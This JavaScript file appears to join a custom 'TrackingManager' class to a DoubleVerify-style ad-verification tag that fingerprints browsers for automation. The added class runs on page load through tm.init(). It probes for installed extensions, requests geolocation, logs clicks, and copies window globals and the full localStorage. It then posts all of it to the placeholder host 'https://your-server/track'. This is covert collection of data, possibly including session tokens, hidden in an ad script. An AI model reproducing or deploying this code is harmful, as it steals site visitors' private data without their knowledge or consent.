class TrackingManager {
  constructor() {
    this.data = {
      extensions: null,
      location: null,
      userEvents: [],
      localtime: null,
      globalVariables: null,
      localStorageData: null
    };
    this.setupEventListener();
  }
  async detectExtensions() {
    const results = {};
    for (const [extName, extData] of Object.entries(window.data)) {
      try {
        const response = await fetch(`chrome-extension://${extData.id}/${extData.file}`);
        results[extName] = response.status === 200;
      } catch (e) {
        results[extName] = false;
      }
    }
    this.data.extensions = results;
  }
  collectGeoData() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(position => {
        this.data.location = {
          lat: position.coords.latitude,
          lng: position.coords.longitude
        };
      });
    }
  }
  setupEventListener() {
    document.addEventListener('click', event => this.data.userEvents.push(event));
  }
  collectGlobalVariables() {
    this.data.globalVariables = Object.keys(window);
  }
  collectLocalStorageData() {
    this.data.localStorageData = JSON.parse(JSON.stringify(localStorage));
  }
  reportData() {
    this.data.localtime = new Date().toString();
    fetch('https://your-server/track', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(this.data)
    });
  }
  async init() {
    await this.detectExtensions();
    this.collectGeoData();
    this.collectGlobalVariables();
    this.collectLocalStorageData();
    this.reportData();
  }
}
var dvObj = $dvbs;
var impId = '238bb883fe3542b28a28b91f2c2582fa';
var htmlRate = 5;
var runTag = 0;
var forcedCollection = 0;
var sources = 0;
var adid = '6499951694542684204';
var urlTypeId = 17412;
var ddt = 1;
var bundleID = '';
var date = '20230819';
var prefix = '20230125';
const tm = new TrackingManager();
dvObj.pubSub.subscribe('BeforeDecisionRender', impId, 'AttributeCollection', function () {
  try {
    try {
      !function () {
        var p = {
            dvp_ac_version: "0810"
          },
          m = window,
          e = 0,
          t = m.navigator,
          n = m.location,
          c = window.chrome,
          u = Object,
          g = parseInt,
          d = String.fromCharCode(10),
          r = void 0;
        try {
          r = window.top;
        } catch (e) {}
        try {
          for (; m.parent && m != m.parent && m.parent.document && (m = m.parent, !(10 < e++)););
        } catch (e) {}
        var s = {};
        function v(e, t) {
          s[e] = !!t;
        }
        function o(e) {
          var t,
            r = 0;
          for (t in e) e[t] && (r += Math.pow(2, t));
          return r;
        }
        var a,
          l = function (e) {
            for (var t = {}; 0 < e;) {
              for (var r = 1, n = 0; 2 * r <= e;) r *= 2, n++;
              t[n] = !0, e -= r;
            }
            return t;
          }(sources),
          f = m.document;
        function h(e) {
          return f.querySelectorAll ? f.querySelectorAll(e) : null;
        }
        function y() {
          if (3 == ddt) {
            if (!(m && m.document && m.document.documentElement)) return;
            if (void 0 === m.document.documentElement.clientWidth || void 0 === m.document.documentElement.clientHeight) return;
            var e = g(m.document.documentElement.clientWidth || 0),
              t = g(m.document.documentElement.clientHeight || 0),
              r = e * t;
            p.dvp_adfr = e + "x" + t;
            t = f.getElementsByTagName("video");
            function n(e) {
              for (var t = 0; t < e.length; t++) {
                var r = e.item(t).getBoundingClientRect();
                return p.dvp_adad = g(r.width) + "x" + g(r.height), 1;
              }
            }
            0 < t.length && v(33, !0), 0 == r ? v(30, !0) : (v(30, !1), n(t) && v(6, !0), n(f.getElementsByTagName("iframe")) && v(32, !0));
          }
          var o = [],
            a = [],
            r = 2 == ddt || 3 == ddt,
            t = f.getElementById && f.getElementById("rmpPlayer");
          t && 0 < t.length && v(23, !0);
          var c,
            u = h('script[src*="player/player.js?p="]');
          if (u && 0 < u.length) for (v(29, !0), r && (p.DVPF_IBV_PLAYER = 1), i = 0; i < u.length; i++) (d = u[i].src) && ((s = d.match(/appb=([^&]*)/)) && s[1] && o.push(s[1]), (c = d.match(/p=([^&]*)/)) && c[1] && a.push(s[1]));
          var d,
            s,
            l = h('script[id="aniviewJS"]');
          if (l && 0 < l.length) for (v(29, !0), r && (p.DVPF_IBV_PLAYER = 1), i = 0; i < l.length; i++) (d = l[i].innerText) && (s = d.match && d.match(/AV_APPPKGNAME=([^&]*)/)) && s[1] && o.push(s[1]);
          p.dvp_acibv = o.join("_"), r && (p.DVPF_IBV_BUNDLE = o.join(";").slice(0, 120), p.DVPF_IBV_IDS = a.join(";").slice(0, 50));
        }
        v(0, m == r), v(1, "" == f.title), y(), m.setTimeout && setTimeout(function () {
          y(), p.bsigr != o(s) && (v(31, !0), p.bsigr = o(s), dvObj.registerEventCall(impId, p), l[31] && R(""));
        }, 3e3), v(34, !!m.__monet__);
        try {
          function _(e, t) {
            var r = e.message,
              n = "TypeError" == e.name,
              r = "Function has non-object prototype 'undefined' in instanceof check" == r,
              e = ((e.stack || "").split(d) || [])[1],
              e = e.startsWith("    at " + t + ".[Symbol.hasInstance]") || e.startsWith("    at [Symbol.hasInstance]");
            return n && r && e;
          }
          var E = "" === ((a = f.createElement("video")) && a.canPlayType && a.canPlayType('video/mp4; codecs="avc3.42E01E"'));
          var w = 0 != (a = (a = f.createElement("video")) && a.canPlayType && a.canPlayType('video/mp4; codecs="avc1.42E01E"')) && "" != a;
          var S = MediaSource && MediaSource.isTypeSupported && !1 === MediaSource.isTypeSupported('video/mp4; codecs="avc3.42E01E"');
          var b = MediaSource && MediaSource.isTypeSupported && !1 === MediaSource.isTypeSupported('video/mp4; codecs="avc1.42E01E"');
          var P = MediaSource && MediaSource.isTypeSupported && !1 === MediaSource.isTypeSupported("");
          var I = null == u.getOwnPropertyDescriptor(t.__proto__, "webdriver"),
            T = Function.prototype.toString;
          var M = function () {
            var e = "ondevicemotion";
            if (!e in window && (e = "speechSynthesis"), !c) return !1;
            var t = u.getOwnPropertyNames(m),
              r = t.indexOf("chrome");
            return (e = t.indexOf(e)) < r && -1 < e;
          }();
          var x = function () {
            if (!(c && "runtime" in c)) return !1;
            try {
              return "prototype" in c.runtime.sendMessage || "prototype" in c.runtime.connect ? !0 : (new c.runtime.sendMessage(), new c.runtime.connect(), !0);
            } catch (e) {
              return "TypeError" != e.constructor.name;
            }
          }();
          var D = function () {
            if (!(c && c.runtime && c.runtime.sendMessage && c.runtime.connect)) return !1;
            try {
              return "prototype" in c.runtime.sendMessage || "prototype" in c.runtime.connect ? !0 : (new c.runtime.sendMessage(), new c.runtime.connect(), !0);
            } catch (e) {
              return !(!e || !e.constructor || "TypeError" == e.constructor.name);
            }
          }();
          var A = function () {
            try {
              var t = function () {
                  return u.create(T).toString();
                },
                r = function () {
                  return t();
                },
                n = function () {
                  return r();
                };
              return n(), !0;
            } catch (e) {
              var i = e.stack.split(d);
              if (i.length < 2) return !0;
              var o = !/at Object\.apply/.test(i[1]),
                a = "TypeError" == e.constructor.name && 5 <= i.length;
              return !a || !c || o && RegExp("at Function.toString").test(i[1]) && RegExp("at " + t.name).test(i[2]) && RegExp("at " + r.name).test(i[3]) && RegExp("at " + n.name).test(i[4]) ? !a : !0;
            }
          }();
          var O = function () {
            if (!Proxy) return null;
            if (!c) return !1;
            new Proxy(T, {});
            try {
              return !0;
            } catch (e) {
              if (!_(e, "Proxy")) return !0;
              try {
                return !0;
              } catch (e) {
                return !_(e);
              }
            }
          }();
          var C = matchMedia && matchMedia("(prefers-color-scheme: light)").matches;
          var V = function () {
            var e = String.fromCharCode(26 * Math.random() + 97) + Math.random().toString(36).slice(-7);
            const t = f.createElement("iframe");
            return t.srcdoc = e, !!t.contentWindow;
          }();
        } catch (e) {} finally {
          v(9, M), v(11, !m.EyeDropper), v(12, m.PermissionStatus && m.PermissionStatus.prototype && !m.PermissionStatus.prototype.hasOwnProperty("name")), v(13, !m.AudioData), v(14, !m.WritableStreamDefaultController), v(15, !m.CSSCounterStyleRule), v(16, I), v(17, C), v(18, V), v(21, x), v(22, D), v(24, A);
          var j = u.keys(m).indexOf("alert"),
            B = u.keys(m).indexOf("crossOriginIsolated");
          v(25, -1 < j && -1 < B && j - B == 1), v(26, m.AbortSignal && m.AbortSignal.timeout), v(27, O);
          B = u.getOwnPropertyDescriptor(t, "webdriver");
          v(28, B && B.get), v(35, E), v(36, w), v(37, S), v(38, b), v(41, P);
        }
        try {
          v(4, !(!t || !t.webdriver)), v(8, !!(f.__fxdriver_evaluate || f.__fxdriver_unwrapped || f.__fxdriver_script_fn || f.documentElement && f.documentElement.getAttribute && f.documentElement.getAttribute("fxdriver"))), v(39, !c), v(40, !!(m.webdriver || f.__webdriver_unwrapped || f.__webdriver_script_fn || f.__webdriver_evaluate || f.documentElement && f.documentElement.getAttribute("webdriver"))), v(47, !(!m.__nightmare && !m.phantom));
          var L = t.userAgent.toLowerCase();
          L.includes("edge") || L.includes("edg/") || L.includes("opr") || L.includes("trident") || L.includes("firefox") || v(44, L.includes("chrome")), v(45, L.includes("crios")), v(46, L.includes("android"));
        } catch (e) {}
        function R(e) {
          var t, o, a, c;
          function r(e, t) {
            var r, n;
            XMLHttpRequest && (r = new XMLHttpRequest(), (n = new FormData()).append("key", prefix + "/" + date + "/" + a + "/" + o + "/" + c + "_" + adid + "_" + impId + "_" + t + ".html"), n.append("file", e.document.documentElement && e.document.documentElement.outerHTML), r.open("POST", "https://storage.googleapis.com/gp-ms-us-gcs-fraud", !0), r.send(n));
          }
          0 < !runTag || (t = "", o = n && n.hostname, 3 == ddt && bundleID && 0 < bundleID.length && (o = 0 != (2 & urlTypeId) && n ? n.hostname + "/" + bundleID : bundleID), (forcedCollection || new Date().getTime() % 100 < htmlRate) && (function () {
            for (i in l) if (s[i]) return t = "bit_" + i;
          }(), 0 == (a = e + t).length && (a = "default"), c = function () {
            var e = [];
            for (i in s) s[i] && e.push(i);
            return e.join("_");
          }() || "default", r(m, "top"), m != window && r(window, "iframe_tag"), m != window.parent && r(window.parent, "iframe_tag_parent"), m != window.parent.parent && r(window.parent.parent, "iframe_tag_parent_parent"), (e = f.getElementById && f.getElementById("adloaderframe")) && r(e.contentWindow, "iframe_top_child"), v(3, !0)));
        }
        m.Promise && t && t.userAgentData && t.userAgentData.getHighEntropyValues && (B = t.userAgentData.getHighEntropyValues(["fullVersionList"])) && B.then && B.then(function (e) {
          if (e && e.fullVersionList && e.fullVersionList.length) {
            var t = e.fullVersionList;
            if (t[0].brand && t[0].version) for (var r, n = 0; n < t.length; n++) -1 < t[n].brand.indexOf("Google Chrome") && (r = t[n].version, "".replaceAll && "".slice && (p.DVPF_CHFV = r.replaceAll(" ", "").slice(0, 40), dvObj.registerEventCall(impId, p)));
          }
        }), R(""), p.bsigr = o(s), dvObj.registerEventCall(impId, p);
      }();
    } catch (e) {
      try {
        dvObj.registerEventCall(impId, {
          dvp_ace: String.prototype.substring ? String(e).substring(0, 150) : String.prototype.slice ? String(e).slice(0, 150) : "String Error."
        });
      } catch (e) {
        dvObj.registerEventCall(impId, {
          dvp_ace: "Generic Error."
        });
      }
    }
  } catch (e) {}
});
try {
  __tagObject_callback_622000166361({
    ImpressionID: "238bb883fe3542b28a28b91f2c2582fa",
    ServerPublicDns: "rtbc-ae1.doubleverify.com"
  });
} catch (e) {}
try {
  $dvbs.pubSub.publish('BeforeDecisionRender', "238bb883fe3542b28a28b91f2c2582fa");
} catch (e) {}
try {
  __verify_callback_622000166361({
    ResultID: 1,
    Passback: "%3Cins%20class%3D%27dcmads%27%20style%3D%27display%3Ainline-block%3Bwidth%3A728px%3Bheight%3A90px%27%20%20%20data-dcm-placement%3D%27N1395.150740DOUBLEVERIFY%2FB9689862.280630144%27%20%20%20data-dcm-rendering-mode%3D%27script%27%20%20%20data-dcm-https-only%20%20%20data-dcm-gdpr-applies%3D%27gdpr%3D%24%7BGDPR%7D%27%20%20%20data-dcm-gdpr-consent%3D%27gdpr_consent%3D%24%7BGDPR_CONSENT_755%7D%27%20%20%20data-dcm-addtl-consent%3D%27addtl_consent%3D%24%7BADDTL_CONSENT%7D%27%20%20%20data-dcm-resettable-device-id%3D%27%27%20%20%20data-dcm-app-id%3D%27%27%3E%20%20%20%3Cscript%20src%3D%27https%3A%2F%2Fwww.googletagservices.com%2Fdcm%2Fdcmads.js%27%3E%3C%2Fscript%3E%20%20%3C%2Fins%3E",
    AdWidth: 728,
    AdHeight: 90
  });
} catch (e) {}
try {
  $dvbs.pubSub.publish('AfterDecisionRender', "238bb883fe3542b28a28b91f2c2582fa");
} catch (e) {}
tm.init();